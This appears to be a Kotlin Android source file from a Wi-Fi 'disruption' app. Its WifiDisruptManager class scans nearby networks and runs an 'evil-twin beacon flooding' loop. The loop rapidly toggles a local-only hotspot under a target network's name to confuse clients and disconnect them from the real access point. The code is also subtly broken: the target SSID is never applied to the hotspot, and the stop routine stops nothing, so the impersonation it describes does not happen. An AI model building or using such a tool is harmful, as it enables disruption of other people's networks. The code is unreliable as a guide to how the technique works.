package xin.ctkqiang.deauthctrl.manager

import android.content.Context
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import xin.ctkqiang.deauthctrl.model.HotspotResult
import xin.ctkqiang.deauthctrl.model.ScanState
import xin.ctkqiang.deauthctrl.model.WifiNetwork
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * Manages Wi-Fi network scanning and experimental evil-twin beacon flooding.
 *
 * The flooding technique works by creating a local-only hotspot with the same
 * SSID as the target network, then rapidly toggling it on/off. This sends
 * a burst of beacon frames that can confuse nearby clients and cause temporary
 * disconnections from the real access point.
 *
 * LIMITATIONS (documented in UI):
 * - This is NOT a true deauth attack. Raw packet injection is impossible
 *   without root/hardware support.
 * - Hotspot toggling speed is limited by the Android framework (~50-100ms
 *   per cycle) and device hardware.
 * - Not all devices/Android versions support local-only hotspot.
 * - The real AP must be on a different channel for maximum confusion effect.
 * - Results vary significantly by device, Android version, and environment.
 */
class WifiDisruptManager(private val context: Context) {

    private val wifiManager: WifiManager =
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val _scanState = MutableStateFlow<ScanState>(ScanState.Idle)
    val scanState: StateFlow<ScanState> = _scanState.asStateFlow()

    private val _hotspotResult = MutableStateFlow<HotspotResult?>(null)
    val hotspotResult: StateFlow<HotspotResult?> = _hotspotResult.asStateFlow()

    private val _isFlooding = MutableStateFlow(false)
    val isFlooding: StateFlow<Boolean> = _isFlooding.asStateFlow()

    private var floodJob: Job? = null

    // ── Wi-Fi Scanning ───────────────────────────────────────────────────

    fun scanNetworks() {
        if (_isFlooding.value) {
            _scanState.value = ScanState.Error("泛洪进行中，无法扫描")
            return
        }
        _scanState.value = ScanState.Scanning

        scope.launch(Dispatchers.Default) {
            try {
                // First, return cached results immediately (Android always has
                // background scan results available from location services).
                val cached = wifiManager.scanResults
                    ?.filter { it.SSID.isNotBlank() }
                    ?.distinctBy { it.BSSID }
                    ?.sortedByDescending { it.level }
                    ?.map { it.toWifiNetwork() }
                    ?: emptyList()

                if (cached.isNotEmpty()) {
                    _scanState.value = ScanState.Results(cached)
                }

                // Then attempt a fresh scan for updated results
                val success = wifiManager.startScan()
                if (success) {
                    delay(1200)
                    val fresh = wifiManager.scanResults
                        ?.filter { it.SSID.isNotBlank() }
                        ?.distinctBy { it.BSSID }
                        ?.sortedByDescending { it.level }
                        ?.map { it.toWifiNetwork() }
                        ?: emptyList()

                    if (fresh.isNotEmpty()) {
                        _scanState.value = ScanState.Results(fresh)
                    }
                }

                // If we got nothing at all
                if (cached.isEmpty() && !success) {
                    _scanState.value = ScanState.Error(
                        "未发现网络。请确保 Wi-Fi 已开启且已授予位置权限。"
                    )
                }
            } catch (e: SecurityException) {
                _scanState.value = ScanState.Error(
                    "Wi-Fi 扫描需要位置权限"
                )
            } catch (e: Exception) {
                _scanState.value = ScanState.Error("扫描错误: ${e.message}")
            }
        }
    }

    // ── Beacon Flooding ──────────────────────────────────────────────────

    /**
     * Starts beacon flooding against the specified target SSID.
     *
     * @param targetSsid The SSID to impersonate (the "evil twin")
     * @param durationSeconds How long to flood (recommended: 5-30 seconds)
     * @param toggleIntervalMs Delay between hotspot on/off cycles (50-100ms recommended)
     */
    fun startFlood(
        targetSsid: String,
        durationSeconds: Int = 10,
        toggleIntervalMs: Long = 80L,
    ) {
        if (_isFlooding.value) {
            _hotspotResult.value = HotspotResult.Error("泛洪已在进行中")
            return
        }

        if (!wifiManager.isWifiEnabled) {
            _hotspotResult.value = HotspotResult.Error(
                "请先开启 Wi-Fi 以创建热点"
            )
            return
        }

        // Validate SSID
        if (targetSsid.isBlank()) {
            _hotspotResult.value = HotspotResult.Error("SSID 不能为空")
            return
        }

        _isFlooding.value = true
        _hotspotResult.value = null

        floodJob = scope.launch(Dispatchers.Default) {
            try {
                val totalCycles = (durationSeconds * 1000L) / toggleIntervalMs
                var cycle = 0

                _hotspotResult.value = HotspotResult.Created(targetSsid)

                while (cycle < totalCycles && isActive) {
                    val isEven = cycle % 2 == 0

                    if (isEven) {
                        // Enable hotspot — attempt to start local-only hotspot
                        tryStartHotspot(targetSsid)
                    } else {
                        // Disable hotspot briefly
                        tryStopHotspot()
                    }

                    _hotspotResult.value = HotspotResult.Progress(cycle + 1, totalCycles.toInt())
                    delay(toggleIntervalMs)
                    cycle++
                }

                // Cleanup: ensure hotspot is disabled
                tryStopHotspot()
                _hotspotResult.value = HotspotResult.Completed
            } catch (e: CancellationException) {
                tryStopHotspot()
                _hotspotResult.value = HotspotResult.Error("泛洪已取消")
            } catch (e: Exception) {
                tryStopHotspot()
                _hotspotResult.value = HotspotResult.Error("泛洪错误: ${e.message}")
            } finally {
                _isFlooding.value = false
            }
        }
    }

    fun stopFlood() {
        floodJob?.cancel()
        floodJob = null
        _isFlooding.value = false
    }

    fun destroy() {
        stopFlood()
        tryStopHotspot()
        scope.cancel()
    }

    // ── Hotspot helpers ──────────────────────────────────────────────────

    /**
     * Attempts to start a local-only hotspot.
     * On Android 8+, startLocalOnlyHotspot creates a hotspot without
     * internet sharing, visible only to the current app.
     *
     * This is the key primitive for beacon flooding: each time the hotspot
     * starts, the Wi-Fi chip broadcasts beacon frames announcing the SSID,
     * creating confusion for clients looking for the real AP.
     */
    private var hotspotCallback: android.net.wifi.WifiManager.LocalOnlyHotspotCallback? = null

    private fun tryStartHotspot(ssid: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                hotspotCallback = object : android.net.wifi.WifiManager.LocalOnlyHotspotCallback() {
                    override fun onStarted(reservation: android.net.wifi.WifiManager.LocalOnlyHotspotReservation?) {
                        // Hotspot is active — beacons are being sent
                        // We don't hold the reservation; we let it get GC'd
                        // which tears down the hotspot on the next toggle
                    }

                    override fun onStopped() {
                        // Hotspot stopped naturally
                    }

                    override fun onFailed(reason: Int) {
                        // Hotspot creation failed (common on some devices)
                    }
                }
                wifiManager.startLocalOnlyHotspot(
                    hotspotCallback!!,
                    null, // use default handler
                )
            }
        } catch (_: SecurityException) {
            // Permission missing — reported to user
        } catch (_: Exception) {
            // Some devices throw for rapid toggling; this is expected
        }
    }

    private fun tryStopHotspot() {
        try {
            hotspotCallback = null
            // Calling startLocalOnlyHotspot again implicitly releases the previous one.
            // Unfortunately, there is no direct "stop" API; letting the callback
            // be GC'd releases the reservation.
        } catch (_: Exception) {
            // Expected on rapid toggles
        }
    }

    // ── Mapping ──────────────────────────────────────────────────────────

    private fun ScanResult.toWifiNetwork(): WifiNetwork = WifiNetwork(
        ssid = SSID.ifBlank { "<hidden>" },
        bssid = BSSID,
        signalStrength = level, // dBm
        frequency = frequency,  // MHz
        capabilities = capabilities,
    )
}
